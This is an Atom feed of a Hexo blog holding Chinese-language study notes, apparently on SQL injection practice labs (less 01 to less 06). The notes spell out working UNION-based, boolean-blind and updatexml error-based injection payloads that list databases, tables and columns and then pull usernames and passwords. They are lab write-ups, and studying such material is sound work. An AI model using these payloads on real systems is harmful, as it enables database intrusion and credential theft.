<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-25T13:59:29.337Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>小知识</title>
    <link href="http://example.com/2022/02/25/%E5%B0%8F%E7%9F%A5%E8%AF%86-1/"/>
    <id>http://example.com/2022/02/25/%E5%B0%8F%E7%9F%A5%E8%AF%86-1/</id>
    <published>2022-02-25T13:58:42.000Z</published>
    <updated>2022-02-25T13:59:29.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-在robort-txt中藏着不允许和允许探测的文件名"><a href="#1-在robort-txt中藏着不允许和允许探测的文件名" class="headerlink" title="1.在robort.txt中藏着不允许和允许探测的文件名"></a>1.在robort.txt中藏着不允许和允许探测的文件名</h2><h2 id="2-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"><a href="#2-ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作" class="headerlink" title="2.ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作"></a>2.ssh使远程计算机通过ss客服端登入本地服务器，实现远程操作</h2><h2 id="3-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"><a href="#3-audit-审计-指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程" class="headerlink" title="3.audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程"></a>3.audit(审计)指按照一定安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞的过程</h2><h2 id="4-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"><a href="#4-crawl-爬行-指顺这内部链接访问网站内页，再顺着导出链接访问其他网站" class="headerlink" title="4.crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站"></a>4.crawl(爬行)指顺这内部链接访问网站内页，再顺着导出链接访问其他网站</h2><h2 id="HTTP-Referer-告知服务器请求来源（浏览器自动加上）"><a href="#HTTP-Referer-告知服务器请求来源（浏览器自动加上）" class="headerlink" title="HTTP Referer: 告知服务器请求来源（浏览器自动加上）"></a>HTTP Referer: 告知服务器请求来源（浏览器自动加上）</h2><h3 id="302或301状态码表示跳转"><a href="#302或301状态码表示跳转" class="headerlink" title="302或301状态码表示跳转"></a>302或301状态码表示跳转</h3><h3 id="Cookie-服务器颁发的凭证"><a href="#Cookie-服务器颁发的凭证" class="headerlink" title="Cookie: 服务器颁发的凭证"></a>Cookie: 服务器颁发的凭证</h3><h3 id="网页-HTML-JS-CSS"><a href="#网页-HTML-JS-CSS" class="headerlink" title="网页=HTML+JS+CSS"></a>网页=HTML+JS+CSS</h3><h2 id="JS-对网页添加动态效果"><a href="#JS-对网页添加动态效果" class="headerlink" title="JS: 对网页添加动态效果"></a>JS: 对网页添加动态效果</h2><h2 id="CSS-给网页添加样式和图片"><a href="#CSS-给网页添加样式和图片" class="headerlink" title="CSS: 给网页添加样式和图片"></a>CSS: 给网页添加样式和图片</h2><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-在robort-txt中藏着不允许和允许探测的文件名&quot;&gt;&lt;a href=&quot;#1-在robort-txt中藏着不允许和允许探测的文件名&quot; class=&quot;headerlink&quot; title=&quot;1.在robort.txt中藏着不允许和允许探测的文件名&quot;&gt;&lt;/a&gt;1.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>6</title>
    <link href="http://example.com/2022/02/14/06/"/>
    <id>http://example.com/2022/02/14/06/</id>
    <published>2022-02-14T02:01:32.000Z</published>
    <updated>2022-02-25T16:06:06.093Z</updated>
    
    <content type="html"><![CDATA[<h3 id="less-06"><a href="#less-06" class="headerlink" title="less 06"></a>less 06</h3><p>1.输入?id=1‘’,页面报错，输入id=1’‘–+，则页面回显正常.</p><p>说明注入点为引号位置。</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’‘ order by 3–+ </p><p>3.运用函数进行逐个判断</p><p>（1）运用函数left进行数据判断</p><p>?id=1’’ and left((select database()),1)=’s’–+ 判断第一位是否是s，然后使用bp进行爆破处理：</p><p> （2）运用数字和字母与ascii码的转换进行判断</p><p>id=1’‘ and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1</p><p>?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 –+  </p><p>————此处用二分法进行猜字段，从而推断数据库的名称</p><p>  （3）用updatexml函数</p><p>查库</p><p>?id=1’‘and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,30),’~’),1)–+</p><p>查表</p><p>?id=1’’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),1,30),’~’),1)–+</p><p>查列</p><p>?id=1’’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,30),’~’),1)–+</p><p>查数据</p><p>?id=1’’ and updatexml(1,concat(0x7e,substr((select group_concat(username，password) from security.users),1,30),’~’),1)–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;less-06&quot;&gt;&lt;a href=&quot;#less-06&quot; class=&quot;headerlink&quot; title=&quot;less 06&quot;&gt;&lt;/a&gt;less 06&lt;/h3&gt;&lt;p&gt;1.输入?id=1‘’,页面报错，输入id=1’‘–+，则页面回显正常.&lt;/p&gt;
&lt;p&gt;说明注入点为</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>5</title>
    <link href="http://example.com/2022/02/13/05/"/>
    <id>http://example.com/2022/02/13/05/</id>
    <published>2022-02-13T12:26:36.000Z</published>
    <updated>2022-02-25T15:59:30.056Z</updated>
    
    <content type="html"><![CDATA[<h3 id="less-05"><a href="#less-05" class="headerlink" title="less 05"></a>less 05</h3><p>1.输入?id=1,系统返回——you are in……——说明输入正确</p><p>​         此类型的注入通过系统返回you are in……来对我们的输入进行判断</p><p>2.输入?id=1’,页面报错，输入id=1‘–+，则页面回显正常.</p><p>说明注入点为引号位置。</p><p>3.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ order by 3–+ </p><p>4.运用函数进行逐个判断</p><p>（1）运用函数left进行数据判断</p><p>?id=1’ and left((select database()),1)=’s’–+ 判断第一位是否是s，然后使用bp进行爆破处理：</p><p> （2）运用数字和字母与ascii码的转换进行判断</p><p>id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1</p><p>?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) &gt;1 –+  </p><p>————此处用二分法进行猜字段，从而推断数据库的名称</p><p>  （3）用updatexml函数</p><p>查库</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,30),’~’),1)–+</p><p>查表</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),1,30),’~’),1)–+</p><p>查列</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,30),’~’),1)–+</p><p>查数据</p><p>?id=1’ and updatexml(1,concat(0x7e,substr((select group_concat(username，password) from security.users),1,30),’~’),1)–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;less-05&quot;&gt;&lt;a href=&quot;#less-05&quot; class=&quot;headerlink&quot; title=&quot;less 05&quot;&gt;&lt;/a&gt;less 05&lt;/h3&gt;&lt;p&gt;1.输入?id=1,系统返回——you are in……——说明输入正确&lt;/p&gt;
&lt;p&gt;​     </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>4</title>
    <link href="http://example.com/2022/02/06/04/"/>
    <id>http://example.com/2022/02/06/04/</id>
    <published>2022-02-06T08:20:18.000Z</published>
    <updated>2022-02-25T15:25:23.373Z</updated>
    
    <content type="html"><![CDATA[<p>1.?id=1 回显有结果，?id=1’系统报错，?id=1’–+——依然报错。此时进行判断类型：</p><p>若?id=1 and 1=2  发现页面回显正常,所以为字符注入。</p><p>观察MySQL命令行，发现该题以  ‘’)  来闭合字符</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’’ )order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’’) union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’’) union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’’) union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’’ )union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’’) union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.?id=1 回显有结果，?id=1’系统报错，?id=1’–+——依然报错。此时进行判断类型：&lt;/p&gt;
&lt;p&gt;若?id=1 and 1=2  发现页面回显正常,所以为字符注入。&lt;/p&gt;
&lt;p&gt;观察MySQL命令行，发现该题以  ‘’)  来闭合字符&lt;/p&gt;
&lt;p&gt;2.输</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>3</title>
    <link href="http://example.com/2022/02/06/03/"/>
    <id>http://example.com/2022/02/06/03/</id>
    <published>2022-02-06T05:35:28.000Z</published>
    <updated>2022-02-25T15:19:06.351Z</updated>
    
    <content type="html"><![CDATA[<p>1.?id=1 回显有结果，?id=1’——报错，?id=1’–+——依然报错。</p><p>观察MySQL命令行，发现该题以  ‘)  来闭合字符</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ )order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’) union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’) union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’) union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’ )union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’) union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.?id=1 回显有结果，?id=1’——报错，?id=1’–+——依然报错。&lt;/p&gt;
&lt;p&gt;观察MySQL命令行，发现该题以  ‘)  来闭合字符&lt;/p&gt;
&lt;p&gt;2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）&lt;/p&gt;
&lt;p&gt;可知列数为3.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>second</title>
    <link href="http://example.com/2022/02/06/second/"/>
    <id>http://example.com/2022/02/06/second/</id>
    <published>2022-02-06T04:37:24.000Z</published>
    <updated>2022-02-25T15:19:53.833Z</updated>
    
    <content type="html"><![CDATA[<p>1.?id=1 回显有结果，?id=1‘回显错误，若为?id=1’–+依然报错，但输入?id=1 and 1=2显示错误则为数字型注入</p><p>————若正确则为字符型</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’ union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’ union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.?id=1 回显有结果，?id=1‘回显错误，若为?id=1’–+依然报错，但输入?id=1 and 1=2显示错误则为数字型注入&lt;/p&gt;
&lt;p&gt;————若正确则为字符型&lt;/p&gt;
&lt;p&gt;2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>注入类型</title>
    <link href="http://example.com/2022/02/04/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
    <id>http://example.com/2022/02/04/%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</id>
    <published>2022-02-04T08:09:46.000Z</published>
    <updated>2022-02-25T14:27:00.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1.注入类型"></a>1.注入类型</h2><p><strong>sql注入形成的原因：用户被输入的非法数据被解释器执行</strong></p><h3 id="由注入类容区分为："><a href="#由注入类容区分为：" class="headerlink" title="由注入类容区分为："></a>由注入类容区分为：</h3><ol><li><p>数字类型注入</p></li><li><p>字符类型注入</p><p>（可通过系统的报错进行判断）</p></li></ol><h3 id="由提交方式分为："><a href="#由提交方式分为：" class="headerlink" title="由提交方式分为："></a>由提交方式分为：</h3><ol><li>get注入</li><li>post注入</li><li>cookies注入</li><li>http注入</li></ol><h3 id="由获取信息不同分为："><a href="#由获取信息不同分为：" class="headerlink" title="由获取信息不同分为："></a>由获取信息不同分为：</h3><ol><li><p>基于bool的盲注，即可以根据返回页面判断条件真假的注入</p></li><li><p>基于时间的盲注，即不能根据页面返回类容判断任何信息，需要用条件语句查看时间延迟语句是否执行来判断。————常见sleep注入</p></li><li><p>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接放回在页面中。</p><p>主要分为三种：</p><p>1.extractvalue函数</p><p>2.updatexml函数</p><p>3.floor()函数</p></li></ol><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-注入类型&quot;&gt;&lt;a href=&quot;#1-注入类型&quot; class=&quot;headerlink&quot; title=&quot;1.注入类型&quot;&gt;&lt;/a&gt;1.注入类型&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;sql注入形成的原因：用户被输入的非法数据被解释器执行&lt;/strong&gt;&lt;/p&gt;
&lt;h3 i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>1</title>
    <link href="http://example.com/2022/01/28/less%2001/"/>
    <id>http://example.com/2022/01/28/less%2001/</id>
    <published>2022-01-28T13:19:38.000Z</published>
    <updated>2022-02-25T13:45:52.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="less-01的学习"><a href="#less-01的学习" class="headerlink" title="less 01的学习"></a>less 01的学习</h2><p>less 1</p><p>1.先输入?id=1，发现回显正常。</p><p>再输入?id=1’,发现系统进行报错，且发现错因是引号，所以位字符型注入。</p><p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p><p>可知列数为3.————?id=1’ order by 3–+ </p><p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p><p>————?id=-1’ union select 1,2,3–+</p><p>使显示位显示的数据为username：2，password：3。</p><p>4.选择username或password的位置进行显示我们要查询的数据。</p><p>用语句————?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p><p>查询显示出好几个库名 选择security作为查询对象。</p><p>或者用语句————?id=-1’ union select 1,2,database()–+进行查询，结果为security</p><p>5.查询表中数据</p><p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p><p>6.查询列中的数据</p><p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p><p>7.查询username和password数据?id=-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;less-01的学习&quot;&gt;&lt;a href=&quot;#less-01的学习&quot; class=&quot;headerlink&quot; title=&quot;less 01的学习&quot;&gt;&lt;/a&gt;less 01的学习&lt;/h2&gt;&lt;p&gt;less 1&lt;/p&gt;
&lt;p&gt;1.先输入?id=1，发现回显正常。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql函数与使用</title>
    <link href="http://example.com/2022/01/26/sql%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2022/01/26/sql%E5%87%BD%E6%95%B0/</id>
    <published>2022-01-26T07:22:00.000Z</published>
    <updated>2022-02-25T13:10:56.040Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-sql的基本函数"><a href="#一-sql的基本函数" class="headerlink" title="一.sql的基本函数"></a>一.sql的基本函数</h4><ol><li><p>left()函数：  left(database(),1)=‘s’                     left(a,b)从左侧截取a的前b位，正确则返回1，错误则返回0</p></li><li><p>regexp函数：select user() regexp ‘r’                 user()的结果是root，regexp为匹配root的正则表达式</p><p>————</p></li><li><p>like函数： select user() like ‘ro%’                        匹配与regexp相似。</p><p>————</p></li><li><p>substr(a,b,c)   select substr() XXXX                       substr(a,b,c)从位置b开始，截取a字符串c位长度</p><p>————</p></li><li><p>ascii()        ASSCII码 与数字和字母进行转换</p><p>————</p></li><li><p>updatexml函数    </p><p>updatexml函数<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>————                        </p><h4 id="二-在MySQL工具下进行使用。"><a href="#二-在MySQL工具下进行使用。" class="headerlink" title="二.在MySQL工具下进行使用。"></a>二.在MySQL工具下进行使用。</h4><p>对于security数据库：（进行数值返回判断）<br> select left(database(),1)=‘s’;   判断前1位是否是s<br> select database() regexp ‘s’;  匹配第一个字符是否是 s<br> select database() like ‘s%’;     匹配第一个字符是否是 s<br> select substr((select database()),1,1)=’s’; 匹配第一个字符是否是 s<br> select substr((select database()),1,3)= ‘sec’; 匹配前三个个字符是否是 sec<br> select ascii(substr((select database()),1,1));    直接回显115  或者是：<br> select ascii(substr((select database()),1,1)) &gt; 110;  如果大于110，就会返回1，否则返回0.</p></li></ol><p>————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一-sql的基本函数&quot;&gt;&lt;a href=&quot;#一-sql的基本函数&quot; class=&quot;headerlink&quot; title=&quot;一.sql的基本函数&quot;&gt;&lt;/a&gt;一.sql的基本函数&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;left()函数：  left(database(),1)</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/10/09/hello-world/"/>
    <id>http://example.com/2021/10/09/hello-world/</id>
    <published>2021-10-09T07:47:34.506Z</published>
    <updated>2021-10-09T07:47:34.506Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
